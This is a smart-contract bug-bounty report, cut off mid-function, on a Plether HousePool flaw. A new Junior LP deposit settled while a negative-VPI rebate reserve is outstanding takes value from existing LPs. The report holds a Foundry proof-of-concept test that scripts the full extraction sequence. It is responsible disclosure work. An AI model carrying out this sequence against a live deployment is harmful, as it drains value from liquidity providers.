# \#99352 [SC-Critical] Negative-VPI reserve timing allows a new Junior LP to capture value from existing LPs

**Submitted on Nov 13th 2026 at 10:32:18 UTC by @AGalx for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99352
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

When a trader receives a negative virtual price impact (VPI) rebate, `HousePool` pays the amount to `MarginClearinghouse` and the rebate is locked as a trader reserve. While that reserve is outstanding, Junior LP deposit shares are priced without recognizing this temporarily transferred, subsequently recoverable value. An unprivileged trader can open a rebate-producing position, settle a large Junior deposit before closing, and recover the VPI reserve into `HousePool` only after receiving new shares. In the supplied Foundry PoC, this timing produces an absolute attacker gain and a lower value for pre-existing Junior LPs relative to a matched no-entry control. If deployed with comparable liquidity and parameters, the mechanism could permit repeatable economic extraction from existing LPs without manipulating the oracle price or requiring victim cooperation after an opposing position is already open.

## Vulnerability Details

### Root cause: the same reserve is outside share valuation at mint time but returns after new ownership is established

The affected code is the Plether Immunefi competition snapshot at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The relevant contracts are `CfdEngineSettlementSidecar.sol`, `MarginClearinghouse.sol`, `CfdEngineProtocolLens.sol`, `HousePool.sol`, and `TrancheVault.sol` under `packages/perps/src/`.

**1. Negative-VPI payout removes value from the LP pool.** `CfdMath` calculates signed virtual price impact. A negative value represents a rebate to the trader. During `CfdEngineSettlementSidecar.executeOpen()`, the settlement path pays the rebate from the pool to the clearinghouse:

```solidity
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets);
}
```

`HousePool.payOut()` reduces the pool's recognized asset balance and transfers the USDG-equivalent settlement tokens out to `MarginClearinghouse`. In the same open settlement, `lockVpiRebateReserve()` reserves the relevant amount against the trader's balance:

```solidity
if (reserveFromFreeAssets > 0) {
    clearinghouse.lockVpiRebateReserve(delta.account, reserveFromFreeAssets);
}
```

The funds are therefore temporarily held and accounted for in the clearinghouse, not as `HousePool` cash. This reservation is not alleged to be freely withdrawable by the trader; the issue is the interaction with the next LP share issuance.

**2. Junior deposit pricing uses a snapshot that does not separately account for the outstanding VPI reserve.** `CfdEngineProtocolLens` constructs the pool input snapshot using `pool.totalAssets()`, terminal NAV, directional liabilities, settlement-buffer targets, and trader claims. `HousePoolInputSnapshot` has no per-trader negative-VPI-reserve field. The settlement buffer is derived from maximum directional liability and is not equivalent to Charlie's specific VPI reserve. At LP epoch settlement, `HousePool` captures the pending Junior principal and existing share supply, and uses that basis to price incoming deposits:

```solidity
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();
if (!juniorActivationDeferred) {
    juniorDepositPhase = _settleDepositPhase(juniorVault, result.cutoffEpoch, juniorDepositPhase, 0, false);
}
```

The VPI payout has already reduced the pool's recognized backing, so a deposit settled during this interval acquires shares on a lower basis than it would after reserve recovery.

**3. Closing the position restores reserved funds after the new Junior shares exist.** In `CfdEngineSettlementSidecar`'s close settlement, `consumeVpiRebateReserve()` debits the trader's reserve and transfers the consumed assets back to `HousePool`:

```solidity
if (delta.vpiRebateReserveConsumedAssets > 0) {
    clearinghouse.consumeVpiRebateReserve(delta.account, host.pool(), delta.vpiRebateReserveConsumedAssets);
}
```

Because Charlie already holds the newly issued Junior shares, the returned value affects an enlarged LP cohort. The alleged broken invariant is **cohort-neutral LP pricing across a recoverable reserve's temporary absence**: a new depositor should not be able to capture value attributable to the pre-existing cohort solely by choosing a deposit settlement between rebate payout and later reserve recovery. This does **not** claim the reserve should always be treated as risk-free NAV or that its recovery is unconditional; the PoC demonstrates the case in which it is in fact fully recovered.

### Permissionless sequence reproduced in the local test

- **Initial state:** Pool assets are approximately `$2,002,000`, including about `$2,000,999.990868` of initial Junior assets. Bob is an independent trader with an `$800,000` LONG; after opening it, he takes no action required by the attack. Charlie has `$100,000` of trader collateral and `$8,000,000` of LP deposit capital. The fixture uses `vpiFactor=0.01e18`, `maxSkewRatio=0.4e18`, 10/20 bps maintenance/initial margin, 300 bps FAD margin, and 500 bps base carry.
- **Open:** Charlie submits an `$800,000` SHORT using `OrderRouter.commitOrder()`; an unprivileged keeper calls `OrderRouter.executeOrder()`. Against Bob's pre-existing LONG, Charlie receives a negative-VPI rebate. At 10 bps Pyth confidence, the open records about `$1,597.77` of VPI reserve in `MarginClearinghouse`.
- **Enter Junior before close:** Charlie calls `TrancheVault.requestDeposit()` for `$8,000,000`. After the epoch activation time, `OrderRouter.settleLpEpoch()` prices and settles the request; Charlie claims the shares, holding approximately **79.99%** of the Junior supply.
- **Recover reserve:** Charlie closes the SHORT through the public Router flow. The close consumes the recorded reserve and returns the corresponding tokens to the pool. The PoC asserts that the reserve after close is zero and that the consumed amount matches the recorded open reserve. Bob's LONG remains open at the same size.
- **Exit:** After the vault's one-hour cooldown, Charlie requests redemption, waits for the applicable LP epoch settlement, and claims the funded USDG. The test measures Charlie's final wallet, clearinghouse, and Junior-share value rather than counting returned deposit principal as profit.

The oracle mark remains **$1.00 throughout**. Both 0 bps and 10 bps Pyth-confidence variants are tested. No stale/known oracle tick, privileged access, protocol-source modification, or Bob cooperation is needed. The pre-existing opposing LONG and this liquidity/configuration remain material prerequisites; the test does not establish how frequently they occur in a live market.

### Proof of Concept and falsification controls

**Test file:** `packages/perps/test/perps/accounting/close/Hyp22VpiJuniorTiming.t.sol`. Run from the repository root at the competition commit:

```bash
forge test --root packages/perps --match-path test/perps/accounting/close/Hyp22VpiJuniorTiming.t.sol -vv
```

The supplied preserved local run record reports **10 passed, 0 failed, 0 skipped** using Foundry 1.5.1 and Solc 0.8.35. The PoC uses repository test doubles for the settlement token and Pyth; no in-scope production contract is mocked or modified. These are local Foundry results, not Arbitrum One transactions. The complete executable Solidity PoC is included in the Proof of Concept section below.

The PoC includes a matched **no-Charlie-LP-entry** control using a snapshot/restored fixture, a **deposit settled only after close** control, and a **Charlie-already-LP-before-skew** control. It checks the authenticated Router receipts, opening and closing reserve balances, unchanged Bob position size, Charlie's absolute wealth increase, counterfactual improvement and old-LP cohort reduction, and the reconciliation between the two counterfactual differences. A close-before-settlement or early-LP entry removes the observed positive absolute profit in the tested cases.

The supplied tests also confirm that the full reserve is consumed or released by close. This report does **not** assert that the exploit depends on a partially uncollected reserve.

## Impact Details

**Affected economic interest:** Value held by the existing Junior LP cohort. The candidate in-scope impact is economic extraction from LP funds, potentially corresponding to *direct theft of user funds* if the program accepts this demonstrated value transfer under that category. The final validity, category, and severity are for Immunefi triage; a local PoC does not prove mainnet exploit prevalence.

### Measured outcomes (USDG-dollar equivalents)

| Pyth confidence | Charlie's absolute wealth change before network fees | Charlie uplift vs. no-entry control | Existing LP cohort's lower value vs. control | Modeled Charlie change after network fees |
| ---: | ---: | ---: | ---: | ---: |
| 0 bps | **+$637.037168** | +$1,278.511745 | **−$1,278.539138** | ≈+$636.60 |
| 10 bps | **+$445.491147** | +$1,405.691593 | **−$1,405.718986** | ≈+$445.06 |

These amounts are deliberately distinguished:

- **Absolute attacker gain:** Charlie's final measured wealth minus his starting wealth in the attack run, including position costs, realized PnL/carry and the paid open-order bounty. This is +$445.491147 at 10 bps, **not** +$1,405.69.
- **Counterfactual attacker uplift:** The difference between Charlie's terminal wealth when he settles Junior entry before close and his terminal wealth under the matched no-entry control (+$1,405.691593 at 10 bps).
- **Pre-existing LP cohort reduction:** The counterfactual decline in the existing LP shares' terminal `convertToAssets(oldLpShares)` value (−$1,405.718986 at 10 bps). The two differential amounts reconcile to **$0.027393** in the 10 bps run. This is a comparative valuation loss, **not** an observed withdrawal of precisely this amount from a victim's wallet.

The reserve created at open is about `$1,597.77` at 10 bps and `$1,597.13` at 0 bps. The full reserve is recovered at close in the demonstrated sequence. Timing controls materially change the result: at 10 bps, settling the deposit **after** closing produces Charlie's absolute change of **−$960.215054**; being an LP **before** the skew yields **−$320.432165**. The corresponding 0 bps results are −$641.489186 and −$384.293459. The tests therefore support a timing-sensitive transfer, rather than claiming the SHORT trade alone always generates a profit.

### Network economics and limits

The included gas analysis is **modeled**, not measured from an Arbitrum One transaction. The preserved neutral-confidence trace counts 6,612,213 EVM call gas over 13 Charlie-path transactions. Adding intrinsic gas, a 50% execution buffer and an estimated Arbitrum L1-data portion yields approximately 10.353 million modeled gas. At an assumed 0.021 gwei and `$2,000/ETH`, estimated network cost is about `$0.434837`, leaving roughly **+$445.06** in the 10 bps case. This estimate excludes the opportunity/financing cost of Charlie's `$8,000,000` LP capital, and the production Pyth-update/provider costs were not measured. Gas assumptions do not establish profitability in every future market condition.

The PoC demonstrates **one reachable local economic sequence** with independent Bob exposure, full redemption funding in the recorded tests, and flat oracle marks. It does not demonstrate a mainnet deployment, attack frequency, a market-wide maximum loss, or an already shipped fix. A related public Arbitrum/Pyth clock-alignment known issue involves a different asserted root cause: this PoC does not require an already-known tick or a favorable price movement. That technical distinction is not itself an Immunefi duplicate/eligibility determination.

## References

**Target:** Plether Immunefi competition source, commit [`a82d4fefb02768e5b3bddcc97dee371eee24fea8`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8).

- [CfdMath: signed VPI calculation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L142-L179)
- [CfdEngineSettlementSidecar: opening rebate payout and reserve creation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L435-L478)
- [HousePool.payOut: recognized balance reduction and transfer](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L599-L613)
- [CfdEngineProtocolLens: pool accounting snapshot](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L49-L73)
- [HousePoolEngineViewTypes: HousePoolInputSnapshot definition](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/HousePoolEngineViewTypes.sol#L25-L36)
- [HousePool: Junior principal/supply used for pricing](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L914-L920)
- [HousePool: deposit settlement and share issuance](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1030-L1092)
- [TrancheVault: share conversion helpers](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1848-L1859)
- [CfdEngineSettlementSidecar: close-time reserve recovery](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L683-L720)
- [Arbitrum gas estimation guide](https://docs.arbitrum.io/arbitrum-essentials/how-to-estimate-gas)
- [Arbitrum NodeInterface reference](https://docs.arbitrum.io/arbitrum-essentials/nodeinterface/reference)
- [Pyth EVM update-fee documentation](https://docs.pyth.network/pro/on-chain-fees)


**Local PoC:** The complete `Hyp22VpiJuniorTiming.t.sol` test is included in the `## Proof of Concept` section below. Save it at `packages/perps/test/perps/accounting/close/Hyp22VpiJuniorTiming.t.sol`. This is an added test only; production contracts remain unchanged.

---

## Proof of Concept

## Proof of Concept

The following is the complete Foundry reproduction test for HYP-22 Variant B, using the locked Plether competition snapshot at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It exercises the production Router, HousePool, MarginClearinghouse, and TrancheVault contracts through the repository's test fixture; it uses the repository's local Pyth and settlement-token test doubles, without modifying in-scope production contracts.

Save this source as:

`packages/perps/test/perps/accounting/close/Hyp22VpiJuniorTiming.t.sol`

Run from the repository root with the project's Foundry dependencies installed (the preserved run used Foundry 1.5.1 and Solc 0.8.35):

```bash
forge test --root packages/perps --match-path test/perps/accounting/close/Hyp22VpiJuniorTiming.t.sol -vv
```

The preserved local run record reports **10 passed, 0 failed, 0 skipped**. This includes matched no-entry controls, delayed-entry tests at 0 and 10 bps confidence, close-before-deposit-settlement tests, and already-LP controls. These outcomes come from the existing run record; no new execution is claimed here.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;
import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {Vm} from "forge-std/Vm.sol";
/// @notice Local, production-route investigation for HYP-22 Variant B and matched timing controls.
/// @dev USDG-like settlement token and Pyth are repository test doubles. No in-scope contract is mocked or modified.
contract Hyp22VpiJuniorTimingTest is BasePerpTest {
    address internal constant BOB = address(0xB0B);
    address internal constant CHARLIE = address(0xC4A2);
    address internal constant KEEPER = address(0x4B33);
    uint256 internal constant DEPTH = 2_000_000e6;
    uint256 internal constant CHARLIE_LP_CAPITAL = 8_000_000e6;
    uint256 internal constant TRADER_CAPITAL = 100_000e6;
    uint256 internal constant NOTIONAL = 800_000e18;
    enum Sequence {
        NoEntry,
        DelayedEntry,
        CloseBeforeDepositSettlement,
        CharlieAlreadyLp
    }
    struct Metrics {
        uint256 poolAssetsInitial;
        uint256 poolAssetsBeforeCharlieEntry;
        uint256 poolAssetsAfterCharlieEntry;
        uint256 poolAssetsBeforeCharlieClose;
        uint256 juniorAssetsInitial;
        uint256 juniorSupplyInitial;
        uint256 oldLpShares;
        uint256 oldLpAssetsFinal;
        uint256 juniorAssetsBeforeCharlieEntry;
        uint256 charlieSharesMinted;
        uint256 juniorSupplyAfterEntry;
        uint256 charlieOwnershipBpsAfterEntry;
        uint256 charlieReserveAfterOpen;
        uint256 charlieReserveAfterClose;
        uint256 reserveConsumedAtClose;
        uint256 charlieOpenFee;
        uint256 charlieCloseFee;
        uint256 charlieOpenBounty;
        uint256 charlieCloseBounty;
        uint256 charlieOpenExecutionGas;
        uint256 charlieCloseExecutionGas;
        uint256 charlieRedeemRequestedShares;
        uint256 charlieRedeemFundedShares;
        uint256 charlieRedeemPaid;
        uint256 charlieRedeemUnfundedShares;
        uint256 charlieStartWealth;
        uint256 charlieEndWealth;
        uint256 bobStartBalance;
        uint256 bobEndBalance;
        uint256 bobStartEquity;
        uint256 bobEndEquity;
        uint256 bobPositionSizeStart;
        uint256 bobPositionSizeEnd;
        int256 charlieOpenVpi;
        int256 charlieCloseVpi;
        int256 charlieCloseRealizedPnl;
        int256 charlieOpenCarry;
        int256 charlieCloseCarry;
    }
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return DEPTH;
    }
    function test_Hyp22_BaselineNoCharlieLp_NeutralConfidence() public {
        _runAndLog(Sequence.NoEntry, 0);
    }
    function test_Hyp22_BaselineNoCharlieLp_TenBpsConfidence() public {
        _runAndLog(Sequence.NoEntry, 100_000);
    }
    function test_Hyp22_VariantBDelayedEntry_NeutralConfidence() public {
        _runAndLog(Sequence.DelayedEntry, 0);
    }
    function test_Hyp22_VariantBDelayedEntry_TenBpsConfidence() public {
        _runAndLog(Sequence.DelayedEntry, 100_000);
    }
    function test_Hyp22_CloseBeforeDepositSettlement_NeutralConfidence() public {
        _runAndLog(Sequence.CloseBeforeDepositSettlement, 0);
    }
    function test_Hyp22_CloseBeforeDepositSettlement_TenBpsConfidence() public {
        _runAndLog(Sequence.CloseBeforeDepositSettlement, 100_000);
    }
    function test_Hyp22_CharlieAlreadyLp_NeutralConfidence() public {
        _runAndLog(Sequence.CharlieAlreadyLp, 0);
    }
    function test_Hyp22_CharlieAlreadyLp_TenBpsConfidence() public {
        _runAndLog(Sequence.CharlieAlreadyLp, 100_000);
    }
    function test_Hyp22_DelayedEntryDifferential_NeutralConfidence() public {
        _assertDelayedEntryDifferential(0);
    }
    function test_Hyp22_DelayedEntryDifferential_TenBpsConfidence() public {
        _assertDelayedEntryDifferential(100_000);
    }
    function _runAndLog(Sequence sequence, uint64 confidence) internal {
        Metrics memory m = _runSequence(sequence, confidence);
        emit log_named_uint("hyp22.sequence", uint256(sequence));
        emit log_named_uint("hyp22.confidence_raw", confidence);
        emit log_named_uint("hyp22.pool_assets_initial", m.poolAssetsInitial);
        emit log_named_uint("hyp22.pool_assets_before_charlie_entry", m.poolAssetsBeforeCharlieEntry);
        emit log_named_uint("hyp22.pool_assets_after_charlie_entry", m.poolAssetsAfterCharlieEntry);
        emit log_named_uint("hyp22.pool_assets_before_charlie_close", m.poolAssetsBeforeCharlieClose);
        emit log_named_uint("hyp22.junior_assets_initial", m.juniorAssetsInitial);
        emit log_named_uint("hyp22.junior_supply_initial", m.juniorSupplyInitial);
        emit log_named_uint("hyp22.junior_assets_before_entry", m.juniorAssetsBeforeCharlieEntry);
        emit log_named_uint("hyp22.charlie_shares_minted", m.charlieSharesMinted);
        emit log_named_uint("hyp22.junior_supply_after_entry", m.juniorSupplyAfterEntry);
        emit log_named_uint("hyp22.charlie_ownership_bps_after_entry", m.charlieOwnershipBpsAfterEntry);
        emit log_named_uint("hyp22.charlie_reserve_after_open", m.charlieReserveAfterOpen);
        emit log_named_uint("hyp22.charlie_reserve_after_close", m.charlieReserveAfterClose);
        emit log_named_uint("hyp22.reserve_consumed_at_close", m.reserveConsumedAtClose);
        emit log_named_int("hyp22.charlie_open_vpi", m.charlieOpenVpi);
        emit log_named_int("hyp22.charlie_close_vpi", m.charlieCloseVpi);
        emit log_named_int("hyp22.charlie_close_realized_pnl", m.charlieCloseRealizedPnl);
        emit log_named_int("hyp22.charlie_open_carry", m.charlieOpenCarry);
        emit log_named_int("hyp22.charlie_close_carry", m.charlieCloseCarry);
        emit log_named_uint("hyp22.charlie_open_fee", m.charlieOpenFee);
        emit log_named_uint("hyp22.charlie_close_fee", m.charlieCloseFee);
        emit log_named_uint("hyp22.charlie_open_bounty_paid", m.charlieOpenBounty);
        emit log_named_uint("hyp22.charlie_close_bounty_paid", m.charlieCloseBounty);
        emit log_named_uint("hyp22.charlie_open_execution_gas", m.charlieOpenExecutionGas);
        emit log_named_uint("hyp22.charlie_close_execution_gas", m.charlieCloseExecutionGas);
        emit log_named_uint("hyp22.charlie_redeem_requested_shares", m.charlieRedeemRequestedShares);
        emit log_named_uint("hyp22.charlie_redeem_funded_shares", m.charlieRedeemFundedShares);
        emit log_named_uint("hyp22.charlie_redeem_paid", m.charlieRedeemPaid);
        emit log_named_uint("hyp22.charlie_redeem_unfunded_shares", m.charlieRedeemUnfundedShares);
        emit log_named_uint("hyp22.charlie_start_wealth", m.charlieStartWealth);
        emit log_named_uint("hyp22.charlie_end_wealth", m.charlieEndWealth);
        emit log_named_int("hyp22.charlie_net_wealth_delta", int256(m.charlieEndWealth) - int256(m.charlieStartWealth));
        emit log_named_uint("hyp22.old_lp_shares", m.oldLpShares);
        emit log_named_uint("hyp22.old_lp_assets_final", m.oldLpAssetsFinal);
        emit log_named_uint("hyp22.bob_start_balance", m.bobStartBalance);
        emit log_named_uint("hyp22.bob_end_balance", m.bobEndBalance);
        emit log_named_uint("hyp22.bob_start_equity", m.bobStartEquity);
        emit log_named_uint("hyp22.bob_end_equity", m.bobEndEquity);
        emit log_named_uint("hyp22.bob_position_size_start", m.bobPositionSizeStart);
        emit log_named_uint("hyp22.bob_position_size_end", m.bobPositionSizeEnd);
    }
    function _runSequence(Sequence sequence, uint64 confidence) internal returns (Metrics memory m) {
        _seedCharlieWealth();
        settlementToken.mint(BOB, TRADER_CAPITAL);
        vm.startPrank(BOB);
        settlementToken.approve(address(clearinghouse), TRADER_CAPITAL);
        clearinghouse.deposit(BOB, TRADER_CAPITAL);
        vm.stopPrank();
        m.poolAssetsInitial = pool.totalAssets();
        m.juniorAssetsInitial = juniorVault.totalAssets();
        m.juniorSupplyInitial = juniorVault.totalSupply();
        m.oldLpShares = juniorVault.balanceOf(address(this));
        m.charlieStartWealth = _charlieWealth();
        m.bobStartBalance = clearinghouse.balanceAssets(BOB);
        m.bobStartEquity = clearinghouse.getAccountEquityAssets(BOB);
        if (sequence == Sequence.CharlieAlreadyLp) {
            m.poolAssetsBeforeCharlieEntry = pool.totalAssets();
            (m.charlieSharesMinted,) = _queueAndActivateCharlieDeposit(confidence);
            m.poolAssetsAfterCharlieEntry = pool.totalAssets();
            m.juniorAssetsBeforeCharlieEntry = m.juniorAssetsInitial;
            m.juniorSupplyAfterEntry = juniorVault.totalSupply();
            m.charlieOwnershipBpsAfterEntry = m.charlieSharesMinted * 10_000 / m.juniorSupplyAfterEntry;
        }
        _openViaRouter(BOB, CfdTypes.Side.LONG, NOTIONAL, 50_000e6, confidence);
        _openViaRouter(CHARLIE, CfdTypes.Side.SHORT, NOTIONAL, 50_000e6, confidence);
        m.charlieReserveAfterOpen = clearinghouse.vpiRebateReserveAssets(CHARLIE);
        m.charlieOpenVpi = _lastReceipt().economics.vpiAssets;
        m.charlieOpenCarry = _lastReceipt().economics.carryAssets;
        m.charlieOpenFee = _lastReceipt().economics.executionFeeAssets;
        m.charlieOpenBounty = _lastReceipt().bounty.bountyPaidAssets;
        m.charlieOpenExecutionGas = _lastExecutionGas;
        assertLt(m.charlieOpenVpi, 0, "Charlie short receives negative VPI in the tested sequence");
        uint256 depositRequestId;
        if (sequence == Sequence.DelayedEntry) {
            m.poolAssetsBeforeCharlieEntry = pool.totalAssets();
            m.juniorAssetsBeforeCharlieEntry = juniorVault.totalAssets();
            (m.charlieSharesMinted, depositRequestId) = _queueAndActivateCharlieDeposit(confidence);
            m.poolAssetsAfterCharlieEntry = pool.totalAssets();
            m.juniorSupplyAfterEntry = juniorVault.totalSupply();
            m.charlieOwnershipBpsAfterEntry = m.charlieSharesMinted * 10_000 / m.juniorSupplyAfterEntry;
        } else if (sequence == Sequence.CloseBeforeDepositSettlement) {
            m.poolAssetsBeforeCharlieEntry = pool.totalAssets();
            m.juniorAssetsBeforeCharlieEntry = juniorVault.totalAssets();
            depositRequestId = _queueCharlieDeposit();
        }
        (uint256 bobSizeBefore,,,,,,) = engine.positions(BOB);
        m.bobPositionSizeStart = bobSizeBefore;
        if (sequence == Sequence.CloseBeforeDepositSettlement) {
            _closeCharlie(confidence, m);
            _settleCharlieDeposit(depositRequestId, confidence);
            m.poolAssetsAfterCharlieEntry = pool.totalAssets();
            m.charlieSharesMinted = juniorVault.balanceOf(CHARLIE);
            m.juniorSupplyAfterEntry = juniorVault.totalSupply();
            m.charlieOwnershipBpsAfterEntry = m.charlieSharesMinted * 10_000 / m.juniorSupplyAfterEntry;
        } else {
            if (sequence == Sequence.NoEntry) {
                m.poolAssetsBeforeCharlieEntry = pool.totalAssets();
                m.poolAssetsAfterCharlieEntry = m.poolAssetsBeforeCharlieEntry;
                m.juniorAssetsBeforeCharlieEntry = juniorVault.totalAssets();
                m.juniorSupplyAfterEntry = juniorVault.totalSupply();
            }
            _closeCharlie(confidence, m);
        }
        if (sequence != Sequence.NoEntry) {
            _redeemCharlie(confidence, m);
        }
        m.charlieEndWealth = _charlieWealth();
        m.oldLpAssetsFinal = juniorVault.convertToAssets(m.oldLpShares);
        m.bobEndBalance = clearinghouse.balanceAssets(BOB);
        m.bobEndEquity = clearinghouse.getAccountEquityAssets(BOB);
        (m.bobPositionSizeEnd,,,,,,) = engine.positions(BOB);
        assertEq(m.bobPositionSizeStart, NOTIONAL, "Bob long opened before the attacker close");
        assertEq(m.bobPositionSizeEnd, m.bobPositionSizeStart, "Bob remains open and unchanged");
        if (sequence != Sequence.NoEntry) {
            assertEq(m.charlieReserveAfterClose, 0, "full close consumes or releases Charlie's VPI reserve");
            assertEq(m.reserveConsumedAtClose, m.charlieReserveAfterOpen, "no VPI reserve remains after full close");
        }
    }
    function _seedCharlieWealth() internal {
        settlementToken.mint(CHARLIE, CHARLIE_LP_CAPITAL + TRADER_CAPITAL);
        vm.startPrank(CHARLIE);
        settlementToken.approve(address(clearinghouse), TRADER_CAPITAL);
        clearinghouse.deposit(CHARLIE, TRADER_CAPITAL);
        vm.stopPrank();
    }
    function _charlieWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(CHARLIE) + clearinghouse.balanceAssets(CHARLIE)
            + juniorVault.convertToAssets(juniorVault.balanceOf(CHARLIE));
    }
    function _openViaRouter(address account, CfdTypes.Side side, uint256 size, uint256 margin, uint64 confidence) internal {
        uint64 id = _commit(account, side, size, margin, false);
        _execute(id, confidence);
    }
    function _closeCharlie(uint64 confidence, Metrics memory m) internal {
        m.poolAssetsBeforeCharlieClose = pool.totalAssets();
        uint64 id = _commit(CHARLIE, CfdTypes.Side.SHORT, NOTIONAL, 0, true);
        _execute(id, confidence);
        OrderV3Types.OrderReceipt memory receipt = _lastReceipt();
        m.charlieCloseVpi = receipt.economics.vpiAssets;
        m.charlieCloseCarry = receipt.economics.carryAssets;
        m.charlieCloseRealizedPnl = receipt.economics.realizedPnlAssets;
        m.charlieCloseFee = receipt.economics.executionFeeAssets;
        m.charlieCloseBounty = receipt.bounty.bountyPaidAssets;
        m.charlieCloseExecutionGas = _lastExecutionGas;
        m.charlieReserveAfterClose = clearinghouse.vpiRebateReserveAssets(CHARLIE);
        m.reserveConsumedAtClose = m.charlieReserveAfterOpen - m.charlieReserveAfterClose;
    }
    function _commit(address account, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal
        returns (uint64 id)
    {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("hyp22", account, router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.isClose = isClose;
        request.targetPrice = ((side == CfdTypes.Side.LONG) == isClose) ? 2e8 : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(account);
        id = router.commitOrder(request);
    }
    uint256 private _lastExecutionGas;
    function _execute(uint64 id, uint64 confidence) internal {
        bytes[] memory updateData = _nextPythUpdate(confidence);
        vm.recordLogs();
        vm.prank(KEEPER);
        uint256 gasBefore = gasleft();
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, updateData);
        _lastExecutionGas = gasBefore - gasleft();
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "bounded Router order executes");
        OrderV3Types.OrderReceipt memory receipt = _receiptFor(id, vm.getRecordedLogs());
        assertEq(uint8(receipt.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(receipt.executor, KEEPER);
        _remember(receipt);
    }
    OrderV3Types.OrderReceipt private _cachedReceipt;
    function _remember(OrderV3Types.OrderReceipt memory receipt) private {
        _cachedReceipt = receipt;
    }
    function _lastReceipt() private view returns (OrderV3Types.OrderReceipt memory) {
        return _cachedReceipt;
    }
    function _receiptFor(uint64 id, Vm.Log[] memory logs)
        internal
        view
        returns (OrderV3Types.OrderReceipt memory receipt)
    {
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter == address(router.lifecycleBook()) && logs[i].topics.length == 4
                    && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector
                    && uint256(logs[i].topics[1]) == id
            ) {
                (bytes32 hash,, uint64 terminalTime, OrderV3Types.OrderReceipt memory found) =
                    abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                assertTrue(router.lifecycleBook().verifyReceipt(found, terminalTime), "authenticated receipt");
                assertEq(router.lifecycleBook().terminalOutcome(id).receiptHash, hash);
                return found;
            }
        }
        revert("missing terminal Router receipt");
    }
    function _queueAndActivateCharlieDeposit(uint64 confidence)
        internal
        returns (uint256 shares, uint256 requestId)
    {
        requestId = _queueCharlieDeposit();
        shares = _settleCharlieDeposit(requestId, confidence);
    }
    function _queueCharlieDeposit() internal returns (uint256 requestId) {
        vm.startPrank(CHARLIE);
        settlementToken.approve(address(juniorVault), CHARLIE_LP_CAPITAL);
        requestId = juniorVault.requestDeposit(CHARLIE_LP_CAPITAL, CHARLIE, CHARLIE);
        vm.stopPrank();
    }
    function _settleCharlieDeposit(uint256 requestId, uint64 confidence) internal returns (uint256 shares) {
        uint256 activation = juniorVault.depositEpochStart(requestId);
        if (block.timestamp < activation) vm.warp(activation);
        router.settleLpEpoch(_nextPythUpdate(confidence));
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, CHARLIE);
